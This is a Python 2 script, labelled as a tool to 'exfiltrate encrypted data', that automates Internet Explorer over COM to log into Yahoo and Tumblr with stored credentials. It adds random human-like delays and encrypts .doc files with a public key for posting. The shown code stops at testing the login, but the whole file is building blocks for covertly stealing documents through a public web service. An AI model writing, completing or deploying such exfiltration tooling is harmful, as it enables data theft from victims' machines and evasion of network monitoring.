'''exfiltrate encrypted data'''
import util

import win32com.client
import os
import fnmatch
import time
import random
#import zlib

RANDOM_MIN = 2
RANDOM_MAX = 4
PUBLIC_KEY = ''

def wait_for_browser(browser):
    '''wait for the broswer to do its thing'''
    ready_states = [4, 'complete']
    while browser.ReadyState not in ready_states:
        time.sleep(0.1)
    return

def readfile(filename, mode='r'):
    '''get key from file'''
    result = ''
    try:
        infile = open(filename, mode=mode)
        result = infile.read()
    finally:
        infile.close()
    return result
def encrypt_post(filename, key=None):
    '''encrypt the file for posting'''
    if key is None:
        key = PUBLIC_KEY
    enc = util.Encryption()

    contents = readfile(filename, 'rb')
    enc_title = enc.encrypt_string(key, filename)
    enc_body = enc.encrypt_string(key, contents)
    return enc_title, enc_body
def random_sleep(min_seconds=RANDOM_MIN, max_seconds=RANDOM_MAX):
    '''sleep for a random amount of time between min and max seconds'''
    time.sleep(random.randint(min_seconds, max_seconds))
    return

def click_button(full_doc, values):
    '''click the specified button'''
    random_sleep()
    clicked = False
    for i in full_doc:
        if i.id in values:
            try:
                i.click()
                clicked = True
                break
            except Exception, err:
                print str(err)
    return clicked

def set_attr(full_doc, values, focus_before=True, focus_after=True, min_seconds=RANDOM_MIN, max_seconds=RANDOM_MIN):
    '''set the attributes'''
    value_set = False
    for i in full_doc:
        if i.id in values.keys():
            if focus_before:
                i.focus()
            random_sleep(min_seconds, max_seconds)
            i.setAttribute('value', values[i.id])
            if focus_after:
                i.focus()
            value_set = True
            break
    return value_set



def login_to_yahoo(ie, values):
    '''log into yahoo to log into tumblr'''
    full_doc = ie.Document.all

    logged_in = False
    forms = [
        'mbr-login-form',
        'signup_form'
    ]
    if set_attr(full_doc, values['username']):
        if click_button(full_doc, values['buttons']):
            wait_for_browser(ie)
            #full_doc = ie.Document.all
            set_attr(full_doc, values['password'], min_seconds=0, max_seconds=1)
            logged_in = click_button(full_doc, values['buttons'])
            if set_attr(full_doc, values['password'], focus_before=False):
                logged_in = click_button(full_doc, values['buttons'])
                wait_for_browser(ie)
    return logged_in
def login_to_tumblr(ie, values):
    '''log into tumblr'''
    time.sleep(5)
    ie.navigate(values['tumblr_url'])
    wait_for_browser(ie)

    full_doc = ie.Document.all

    logged_in = False
    if set_attr(full_doc, values['username']):
        logged_in = click_button(full_doc, values['buttons'])
        wait_for_browser(ie)
    return logged_in

def main():
    '''main'''
    global PUBLIC_KEY
    PUBLIC_KEY = readfile(filename='pub.key')
    priv_key = readfile(filename='priv.key')

    doc_types = ['.doc']

    try:
        infile = open('kvps.txt')
        lines = infile.readlines()
    finally:
        infile.close()

    #util.test_encryption((PUBLIC_KEY, priv_key), verbosity=0)
    login_values = {
        'url' : str.strip(lines[0]),
        'buttons' : [
            'login-signin',
            'signup_forms_submit'
        ],
        'username' : {
            'login-username' : str.strip(lines[1]),
            'signup_determine_email' : str.strip(lines[1])
        },
        'password' : {
            'login-passwd' : str.strip(lines[2])
        },
        'tumblr_url' : str.strip(lines[3])
    }
    test_login(login_values)


class MyBrowser(object):
    '''browser abstraction'''
    def __init__(self):
        self._ie = None
    def get_ie(self):
        '''get an ie instance'''
        if self._ie is None:
            self._ie = win32com.client.Dispatch('InternetExplorer.Application')
        return self._ie
    def visible(self, visible=0):
        '''set ie visible'''
        ie = self.get_ie()
        ie.visible = visible
    def wait_for_browser(self):
        '''wait for the broswer to do its thing'''
        ie = self.get_ie()
        ready_states = [4, 'complete']
        while ie.ReadyState not in ready_states:
            time.sleep(0.1)
        return
    def navigate(self, target):
        '''navigate to target'''
        ie = self.get_ie()
        ie.Navigate(target)
        self.wait_for_browser()

def open_browser(values, visible=0):
    my_ie = MyBrowser()
    my_ie.visible(visible=visible)
    my_ie.navigate(values['url'])
    return my_ie.get_ie()

def test_login(values):
    '''test the login process'''
    ie = open_browser(values, visible=1)
    print 'Logging into yahoo...'
    login_to_yahoo(ie, values)
    print 'Logged in.'

    print 'Navigating to tumblr...'
    login_to_tumblr(ie, values)
    print 'Done.'


if __name__ == '__main__':
    main()
